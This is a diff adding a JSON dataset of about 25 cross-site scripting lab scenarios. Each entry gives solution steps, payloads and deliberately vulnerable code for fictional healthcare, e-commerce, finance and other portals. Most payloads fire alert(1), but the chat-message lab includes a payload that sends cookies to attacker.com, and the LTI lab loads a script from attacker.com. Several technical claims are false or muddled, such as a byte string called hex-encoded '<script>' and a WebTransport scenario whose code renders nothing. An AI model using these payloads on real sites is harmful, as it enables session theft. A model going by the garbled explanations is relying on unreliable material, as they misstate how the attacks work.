@@ -1,0 +1,456 @@
+[
+    {
+      "Lab scenario": "DOM-based XSS in Healthcare Portal URL Fragment Processing",
+      "Lab Description": "Patient records system dynamically loads content from URL fragments using vulnerable decodeURIComponent() parsing. The application renders lab results without output encoding. To solve: Execute alert(document.domain) through double-encoded hash payloads.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Intercept fragment change event using Burp Suite's DOM Invader extension",
+        "Validate with payload: #%3Cimg%2520src%3Dx%2520onerror%3Dalert%25281%2529%3E",
+        "Bypass client-side validation using null-byte termination",
+        "Chain with history.replaceState() to trigger parser differential",
+        "Verify in legacy browser modes"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "#<img%20src=x%20onerror=alert(window.origin)>",
+        "javascript:eval(decodeURIComponent('%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%64%6f%6d%61%69%6e%29'))"
+      ],
+      "srcCode": "window.onhashchange = () => {\n  const content = decodeURIComponent(location.hash.slice(1));\n  document.getElementById('results').innerHTML = content; // Vulnerable\n}"
+    },
+    {
+      "Lab scenario": "Stored XSS in E-Commerce Product Reviews via AngularJS Sandbox Escape",
+      "Lab Description": "Product review system uses AngularJS 1.8 with unsafe $sce configuration. The application sanitizes input but allows certain HTML elements. To solve: Achieve persistent XSS using prototype pollution in review comments.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Identify AngularJS version via source map analysis",
+        "Craft payload: {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}",
+        "Bypass CSP using angular.element().append() sink",
+        "Automate with Postman collection targeting /api/reviews",
+        "Verify persistence across user sessions"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "<div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}</div>",
+        "<input ng-focus=\"$event.path[0].ownerDocument.defaultView.alert(1)\">"
+      ],
+      "srcCode": "app.post('/reviews', (req, res) => {\n  const review = {\n    content: req.sanitize(req.body.content) // Incomplete\n  };\n  db.save(review);\n});"
+    },
+    {
+      "Lab scenario": "Mutation XSS in Social Media SVG Avatar Upload",
+      "Lab Description": "Profile picture uploader accepts SVG files but fails to sanitize foreignObject tags. The application uses DOMPurify 2.4.0 with unsafe configuration. To solve: Achieve XSS through namespace confusion in SVG/HTML5 parser.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Upload test SVG using OWASP ZAP file upload scanner",
+        "Craft payload: <svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>",
+        "Bypass sanitizer using MathML namespace prefixes",
+        "Combine with iframe srcdoc attribute",
+        "Verify in Firefox's SVG rendering engine"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "<svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>",
+        "<svg><animate attributeName='href' values='javascript:alert(1)'/>"
+      ],
+      "srcCode": "app.post('/avatar', (req, res) => {\n  const svg = DOMPurify.sanitize(req.files.avatar.data);\n  fs.writeFileSync(uploadPath, svg); // Sanitization bypass\n});"
+    },
+    {
+      "Lab scenario": "Blind XSS in Customer Support Chat WebSocket Messages",
+      "Lab Description": "Live chat application stores WebSocket messages in admin panel with 12-hour delay. The application uses raw WebSocket.send() without output encoding. To solve: Trigger alert() when support agent views chat history.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Intercept WebSocket handshake with Burp Suite",
+        "Craft delayed payload: <img src=x onerror=setTimeout(()=>alert(1),43200000)>",
+        "Bypass message size limits using DEFLATE compression",
+        "Automate with Python websockets library",
+        "Monitor admin interface for payload execution"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "<script>fetch('https://attacker.com?cookie='+document.cookie)</script>",
+        "<iframe srcdoc='<script>parent.alert(1)</script>'></iframe>"
+      ],
+      "srcCode": "wss.on('connection', (ws) => {\n  ws.on('message', (msg) => {\n    db.storeMessage(msg); // Raw storage\n  });\n});"
+    },
+    {
+      "Lab scenario": "Reflected XSS in Travel Booking API JSONP Endpoint",
+      "Lab Description": "Flight search API implements JSONP callback without validation. The application reflects callback parameter in Content-Type header. To solve: Achieve XSS through JavaScript MIME type confusion.",
+      "Difficulty Level": "Easy",
+      "Solution Steps": [
+        "Identify JSONP endpoint via ?callback= param",
+        "Craft payload: /api/search?callback=alert(1)//",
+        "Bypass charset restrictions using UTF-7 encoding",
+        "Automate with curl and timing analysis",
+        "Verify in IE11 compatibility mode"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "/**/alert(1);",
+        ")?}alert(1);//",
+        "jQuery3110([{data:1}])"
+      ],
+      "srcCode": "app.get('/api/search', (req, res) => {\n  res.set('Content-Type', 'application/javascript');\n  res.send(`${req.query.callback}(${JSON.stringify(results)})`);\n});"
+    },
+    
+    {
+        "Lab scenario": "DOM XSS in IoT Dashboard WebSocket Analytics",
+        "Lab Description": "Smart factory dashboard visualizes sensor data via WebSocket messages with unsafe SVG rendering. The application uses unencoded device IDs in dynamically created SVG elements. To solve: Inject JavaScript through malicious sensor metadata.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Intercept WebSocket handshake using OWASP ZAP",
+        "Craft payload: {\"sensor\":\"<svg onload=alert(1)>\"}",
+        "Bypass message validation using chunked transfer encoding",
+        "Chain with WebSocket reconnection mechanisms",
+        "Verify through real-time gauge visualization"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "ws://[target]/push?sensorId=1<svg/onload=alert(document.domain)>",
+        "{\"type\":\"telemetry\",\"data\":\"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e\"}"
+        ],
+        "srcCode": "const ws = new WebSocket(URL);\nws.onmessage = (e) => {\n  document.getElementById('viz').innerHTML += \n    JSON.parse(e.data).sensorTag; // Vulnerable\n};"
+    },
+    {
+        "Lab scenario": "Stored XSS in CMS Markdown Renderer via SVG Filter Bypass",
+        "Lab Description": "Blog platform allows Markdown posts containing SVGs that are processed by a vulnerable DOMPurify configuration. The application whitelists 'filter' CSS property in SVG styles. To solve: Achieve persistent XSS through CSS animation payloads.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Create post with payload: ![x](x.svg)",
+        "Craft SVG: <svg><style>@keyframes x{from{filter:url(\"javascript:alert(1)\")}}</style>",
+        "Bypass CSP using hosted SVG with same-origin policy",
+        "Automate with Python Requests library",
+        "Verify through scheduled post publication"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "<svg><style>a{filter:url('data:,alert(1)')}</style></svg>",
+        "<svg><foreignObject><div style='filter:url(\"javascript:eval(atob('YWxlcnQoMSk='))\")>X</div></foreignObject></svg>"
+        ],
+        "srcCode": "app.post('/articles', (req, res) => {\n  const sanitized = DOMPurify.sanitize(req.body.content, {\n    ALLOWED_ATTR: ['style'] // Dangerous config\n  });\n  db.saveArticle(sanitized);\n});"
+    },
+    {
+        "Lab scenario": "Mutation XSS in API Gateway Error Log Visualization",
+        "Lab Description": "Cloud API gateway displays error logs using innerText with vulnerable CSS escape sequences. The application uses Chromium's textContent normalization incorrectly. To solve: Abuse CSS unicode escapes to reconstruct executable code.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Trigger API errors with malformed JWT tokens",
+        "Craft payload: \\FC\\48\\D3\\CD\\A1\\BC (hex-encoded <script>)",
+        "Bypass textContent sanitization using CSS.escape() polyfill",
+        "Chain with ::before pseudo-element injection",
+        "Verify in Chrome DevTools Computed Styles"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "\\3C script\\3E alert(1)\\3C /script\\3E",
+        "<\\u0053\\u0043\\u0052\\u0049\\u0050\\u0054>alert(1)</\\u0053CRIPT>"
+        ],
+        "srcCode": "app.use((err, req, res, next) => {\n  logger.error(err.message);\n  res.status(500).send(`<pre>${err.message}</pre>`); // Unsafe\n});"
+    },
+    {
+        "Lab scenario": "Blind XSS in Video Conferencing Closed Captioning",
+        "Lab Description": "WebRTC-based meeting platform stores subtitle transcripts in admin panel. The application uses insecure text-to-VTT conversion with null-byte handling flaws. To solve: Achieve delayed XSS through crafted subtitle metadata.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Inject payload in .vtt file header: WEBVTT\nX-TIMESTAMP-MAP=LOCAL:alert(1)",
+        "Bypass MIME type validation using alternate encoding",
+        "Automate with FFmpeg subtitle injection",
+        "Monitor admin interface for payload execution",
+        "Combine with CSRF to force payload download"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "WEBVTT\n\n00:00:00.000 --> 00:00:10.000\n<v <script>alert(1)</script>>",
+        "X-TIMESTAMP-MAP=MPEGTS:181002,LOCAL:javascript:eval('alert(1)')"
+        ],
+        "srcCode": "app.post('/upload-subtitles', (req, res) => {\n  const vttContent = req.files.subs.data.toString();\n  db.saveSubtitles(vttContent.replace(/</g, '&lt;')); // Partial sanitization\n});"
+    },
+    {
+        "Lab scenario": "Reflected XSS in Cryptocurrency Exchange QR Code Generator",
+        "Lab Description": "Wallet address QR generator reflects untrusted input in SVG data URLs. The application uses unencoded user-controlled 'label' parameter in QR code metadata. To solve: Break SVG context through multiline payloads.",
+        "Difficulty Level": "Easy",
+        "Solution Steps": [
+        "Intercept QR generation request with Burp Suite",
+        "Craft payload: label=</text><script>alert(1)</script>",
+        "Bypass SVG XML validation using CDATA sections",
+        "Automate with QR code reader validation",
+        "Verify through mobile app scanning"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "<image xlink:href=\"javascript:alert(1)\"/>",
+        "<![CDATA[</text><script>alert(1)</script>]]>"
+        ],
+        "srcCode": "app.get('/qr', (req, res) => {\n  const svg = `<svg>...<text>${req.query.label}</text>...</svg>`;\n  res.type('image/svg+xml').send(svg); // No encoding\n});"
+    },
+{
+        "Lab scenario": "DOM-based XSS in Fitness Tracker URL Parameter Processing",
+        "Lab Description": "Workout analytics dashboard dynamically loads user stats from URL parameters using vulnerable document.write(). The application parses heart rate zones without output encoding. To solve: Execute alert(document.cookie) through malformed query string payloads.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Intercept analytics request using Burp Suite param miner",
+        "Validate with payload: ?zone=<svg/onload=confirm(1)>",
+        "Bypass URL encoding using backticks and template literals",
+        "Chain with window.name propagation",
+        "Verify through mobile app WebView"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+        "<img src='x' onerror=`alert(${document.cookie})`>"
+        ],
+        "srcCode": "app.get('/stats', (req, res) => {\n  res.send(`<script>document.write('${req.query.zone}')</script>`);\n});"
+    },
+    {
+        "Lab scenario": "Stored XSS in Project Management Tool Clipboard Events",
+        "Lab Description": "Task collaboration platform insecurely handles paste events in rich text editor. The application uses execCommand() with dangerous 'insertHTML' operations. To solve: Achieve persistent XSS through crafted spreadsheet cell paste operations.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Prepare malicious CSV: =HYPERLINK(\"javascript:alert(1)\",\"Click\")",
+        "Paste into task description using LibreOffice Calc",
+        "Bypass sanitization using white-space obfuscation",
+        "Automate with Puppeteer clipboard API",
+        "Verify through collaborative editing sessions"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "=IMAGE(\"javascript:alert(1)\", 1)",
+        "=WEBSERVICE(\"data:text/html,<script>alert(1)</script>\")"
+        ],
+        "srcCode": "document.addEventListener('paste', (e) => {\n  const html = e.clipboardData.getData('text/html');\n  document.getElementById('editor').innerHTML = html; // Unsafe\n});"
+    },
+    {
+        "Lab scenario": "Mutation XSS in Social Media Image Metadata Processing",
+        "Lab Description": "Photo sharing platform parses EXIF data from user uploads using vulnerable exifr library. The application renders GPS coordinates in unescaped popup tooltips. To solve: Inject JavaScript through crafted longitude values in JPEG headers.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Modify EXIF data using exiftool: -GPSLongitude=\"<svg/onload=alert(1)>\"",
+        "Bypass MIME type validation using progressive JPEGs",
+        "Chain with EXIF orientation tag manipulation",
+        "Automate with Python Pillow library",
+        "Verify through mobile app location previews"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "-GPSLongitudeRef=\"</title><script>alert(1)</script>\"",
+        "-UserComment=\"javascript/* */:alert(1)\""
+        ],
+        "srcCode": "app.post('/upload', (req, res) => {\n  const metadata = exifr.parse(req.files.image.data);\n  res.render('preview', { coords: metadata.GPS }); // Unsafe\n});"
+    },
+    {
+        "Lab scenario": "Blind XSS in E-Learning Platform LTI Integration",
+        "Lab Description": "Course management system processes Learning Tools Interoperability (LTI) launches without validating custom parameters. The application logs launch data in admin interface with 24h delay. To solve: Achieve delayed XSS through crafted lis_result_sourcedid parameter.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Intercept LTI launch using OAuth 1.0 signing tools",
+        "Craft payload: lis_result_sourcedid=<img src=x onerror=alert(1)>",
+        "Bypass signature validation using parameter substitution",
+        "Automate with Python requests_oauthlib",
+        "Monitor admin gradebook interface"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "custom_param=%3Cscript%20src%3D%22https%3A%2F%2Fattacker.com%2Fxss.js%22%3E%3C%2Fscript%3E",
+        "ext_submit=\"javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))\""
+        ],
+        "srcCode": "app.post('/lti', (req, res) => {\n  db.logLaunch(req.body); // Raw storage\n  res.redirect('/launch-success');\n});"
+    },
+    {
+        "Lab scenario": "Reflected XSS in Retail Analytics CSV Injection",
+        "Lab Description": "Sales dashboard exports filtered results as CSV files with vulnerable Excel-style formula handling. The application reflects search terms in sheet names without encoding. To solve: Achieve XSS through crafted sheet title payloads.",
+        "Difficulty Level": "Easy",
+        "Solution Steps": [
+        "Intercept export request using Burp Suite",
+        "Craft payload: ?search=']!A1<iframe/onload=alert(1)>",
+        "Bypass CSV quoting using tab characters",
+        "Automate with headless Chrome downloads",
+        "Verify through LibreOffice Calc rendering"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "=HYPERLINK(\"javascript:alert(1)\", \"Malicious Link\")",
+        "@@=1-1=alert(document.domain)-1"
+        ],
+        "srcCode": "app.get('/export', (req, res) => {\n  const sheetName = req.query.search || 'Results';\n  res.attachment(`${sheetName}.csv`);\n  res.send(`Sheet: ${sheetName}\\n${csvData}`); // Unsafe\n});"
+    },
+    
+    {
+    "Lab scenario": "DOM XSS via WebAssembly Memory Corruption in Cryptocurrency Wallet",
+    "Lab Description": "Blockchain wallet uses WebAssembly for transaction signing with unsafe memory buffer sharing between JS/WASM. The application implements direct memory access via ArrayBuffer without validation. To solve: Achieve arbitrary JS execution through crafted memory pointer manipulation.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+        "Analyze WASM module using WasmFiddle debugger",
+        "Craft payload: (export \"memory\" (memory $hack 1 256))",
+        "Bypass CSP using wasm-unsafe-eval directive",
+        "Chain with SharedArrayBuffer timing attacks",
+        "Verify via Chrome DevTools Memory Inspector"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "payloads": [
+        "wasmCompile(`(module (memory (export \"memory\") 1 256)`)",
+        "data:application/wasm;base64,AGFzbQEAAAABCgJgAgADfAIBAX8CAAN/AQALBwEEAQEBAQEBAQsHAXwDAQEBAQAKCwEJAEECfwFBCgAaAAoACQA="
+    ],
+    "srcCode": "const wasmBuffer = new Uint8Array(userUploadedData);\nconst memory = new WebAssembly.Memory({ initial: 1 });\nWebAssembly.instantiate(wasmBuffer, { env: { memory } }); // Unsafe"
+    },
+    {
+    "Lab scenario": "Stored XSS in API Gateway JWT Debug Header Processing",
+    "Lab Description": "Microservices API gateway implements verbose error logging with JWT header reflection. The application stores malformed JWTs in admin Kibana dashboard without sanitization. To solve: Achieve persistent XSS through crafted JWT header injection.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+        "Intercept API request with invalid JWT using Burp Suite",
+        "Craft payload: {\"alg\":\"<svg/onload=alert(1)>\"}",
+        "Bypass base64url encoding using non-UTF8 byte sequences",
+        "Automate with Python PyJWT library",
+        "Monitor ELK stack dashboard for payload execution"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "payloads": [
+        "eyJhbGciOiI8c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+In0.X",
+        "eyJ0eXAiOiJKV1QiLCJhbGciOiJcdTAwM2NcdTAwM2UifQ=="
+    ],
+    "srcCode": "app.use((err, req, res, next) => {\n  logger.error(`JWT Header: ${req.headers.authorization}`); // Unsafe log\n  next(err);\n});"
+    },
+    {
+    "Lab scenario": "Stored XSS in Social Media Post Markdown Anchor Validation",
+    "Lab Description": "Platform allows custom anchor tags in Markdown posts with vulnerable href sanitization. The application uses regex bypassable through URL-encoded newline characters. To solve: Achieve persistent XSS via javascript: protocol in disguised URLs.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+        "Create post with payload: [XSS](javascript:%0aalert(1))",
+        "Bypass sanitizer using tab-separated URL encoding",
+        "Chain with CSP nonce reuse attack",
+        "Automate with headless browser posting bot",
+        "Verify through mobile app WebView rendering"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "payloads": [
+        "[Click](javascript:alert(document.domain))",
+        "[Legit](j%0a%0d%09avascript:prompt(1))"
+    ],
+    "srcCode": "function sanitizeLink(href) {\n  return href.replace(/^javascript:/i, ''); // Incomplete\n}"
+    },
+    {
+    "Lab scenario": "Mutation XSS in Web Bundle Document Viewer via Content-Type Confusion",
+    "Lab Description": "Document collaboration tool parses .wbn bundles with improper MIME type validation. The application treats text/markdown resources as text/html when previewing. To solve: Achieve XSS through crafted resource type mismatches.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+        "Create malicious bundle using wbn CLI tool",
+        "Inject payload: ---\nContent-Type: text/html\n\n<script>alert(1)</script>",
+        "Bypass integrity checks via length extension attacks",
+        "Automate with Web Bundle Node.js API",
+        "Verify in Chrome's Isolated Web Apps"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "payloads": [
+        "sha256-/3yc...=: <html><body onload=alert(1)></body></html>",
+        "application/octet-stream;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+    ],
+    "srcCode": "app.post('/upload', (req, res) => {\n  const bundle = parseWebBundle(req.body);\n  if(bundle.signatureValid) {\n    res.render('preview', { content: bundle.resources[0].data }); // Unsafe\n});"
+    },
+    {
+    "Lab scenario": "DOM XSS via Trusted Types Bypass in iframe Policy Inheritance",
+    "Lab Description": "CMS implements Trusted Types but allows policy inheritance in sandboxed iframes. The application uses document.write() with lax default policies. To solve: Escape iframe sandbox through prototype pollution of trustedTypes.defaultPolicy.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+        "Identify iframe with policy using TT Auditor extension",
+        "Craft payload: <iframe srcdoc=\"<script>alert(1)</script>\">",
+        "Bypass CSP using policy.createHTML() callback override",
+        "Chain with DOM clobbering of trustedTypes.emptyHTML",
+        "Verify in Chromium-based browsers"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "payloads": [
+        "trustedTypes.createPolicy('default', {createHTML: s => s});",
+        "<iframe src=\"javascript:trustedTypes.emptyHTML\"></iframe>"
+    ],
+    "srcCode": "app.get('/embed', (req, res) => {\n  res.send(`<iframe srcdoc='${req.query.content}'></iframe>`);\n  console.warn('Embed content:', req.query.content); // Debug log\n});"
+    },
+    
+    {
+        "Lab scenario": "WebTransport Session Hijacking in Telehealth Platform",
+        "Lab Description": "Real-time patient monitoring uses WebTransport for biometric streaming with insecure session handling. The application reflects session IDs in error messages without encoding. To solve: Achieve XSS through bidirectional stream poisoning with malformed datagrams.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Capture session initialization using Chrome's net-export",
+        "Craft payload: new TextEncoder().encode('</script><svg onload=alert(1)>')",
+        "Bypass CORS using WebTransport subresource requests",
+        "Automate with Node.js webtransport library",
+        "Verify through real-time EKG visualization"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "webtransport://[target]/sessionId=<script>alert(1)</script>",
+        "data:application/octet-stream;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+        ],
+        "srcCode": "const transport = new WebTransport(url);\ntransport.datagrams.writable.getWriter().write(\n  new TextEncoder().encode(userInput) // Unsafe\n);"
+    },
+    {
+        "Lab scenario": "Import Maps Injection in Stock Trading Dashboard",
+        "Lab Description": "Financial dashboard dynamically loads modules using user-controlled import maps. The application constructs JSON without proper escaping. To solve: Hijack module resolution to load malicious ESM from attacker-controlled domain.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Intercept import map request via Burp Suite",
+        "Inject payload: {\"imports\":{\"react\":\"data:text/javascript,alert(1)\"}}",
+        "Bypass SRI using import assertions",
+        "Automate with Playwright module interception",
+        "Verify through trading chart visualization"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "<script type=\"importmap\">{\"imports\":{\"lodash\":\"javascript:alert(1)\"}}</script>",
+        "import('data:text/javascript,alert(document.domain)');"
+        ],
+        "srcCode": "app.get('/config', (req, res) => {\n  res.json({ imports: JSON.parse(req.query.modules) });\n});"
+    },
+    {
+        "Lab scenario": "WebGL Shader XSS in 3D Design Tool",
+        "Lab Description": "CAD software processes vertex shaders from untrusted sources with debug logging. The application converts GLSL errors to HTML without sanitization. To solve: Inject JavaScript through crafted preprocessor directives.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Trigger shader compilation errors with malformed directives",
+        "Craft payload: #error </style><script>alert(1)</script>",
+        "Bypass error formatting using GLSL line continuations",
+        "Chain with ANGLE_instanced_arrays extension",
+        "Verify through Chrome WebGL Inspector"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "#pragma optimize(off)\n#error <img/src=x onerror=alert(1)>",
+        "#line 1 \"</canvas><svg/onload=alert(1)>\""
+        ],
+        "srcCode": "try {\n  gl.compileShader(shader);\n} catch (e) {\n  showError(`GLSL Error: ${e.message}`); // Unsafe\n}"
+    },
+    {
+        "Lab scenario": "Service Worker Cache Poisoning XSS in PWA News Reader",
+        "Lab Description": "Progressive Web App caches API responses with stale-while-revalidate strategy. The application uses Cache API without request validation. To solve: Poison cache to serve malicious JavaScript from /api/feed endpoint.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Identify cacheable routes via Lighthouse audits",
+        "Craft response: HTTP/1.1 200 OK\nContent-Type: text/javascript\n\nalert(1)",
+        "Bypass CORS using no-cors fetch mode",
+        "Automate with Postman Interceptor",
+        "Verify through offline mode exploitation"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "self.addEventListener('fetch', e => e.respondWith(\n  new Response('<script>alert(1)</script>')\n));",
+        "for(;;);{\"payload\":\"</script><svg onload=alert(1)>\"}"
+        ],
+        "srcCode": "self.addEventListener('fetch', (e) => {\n  e.respondWith(caches.match(e.request)); // No validation\n});"
+    },
+    {
+        "Lab scenario": "CSSOM Mutation XSS in Analytics Dashboard",
+        "Lab Description": "Business intelligence tool processes CSS variables from URL parameters with vulnerable CSS.supports() check. The application uses innerHTML with style tag reflection. To Solve: Achieve XSS through CSS @import rule parser differentials.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Identify CSS injection point using :target pseudo-class",
+        "Craft payload: --var: </style><script>alert(1)</script>",
+        "Bypass sanitizer using CSS escape sequences",
+        "Chain with adoptedStyleSheets API",
+        "Verify through Safari's CSS parser"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "@import 'javascript:alert(1)';",
+        "<style>a{content: \"\\3C script\\3E alert(1) \\3C /script\\3E\"}</style>"
+        ],
+        "srcCode": "document.getElementById('theme').innerHTML = \n  `:root { ${req.query.vars} }`; // Vulnerable"
+    }   
+  ]
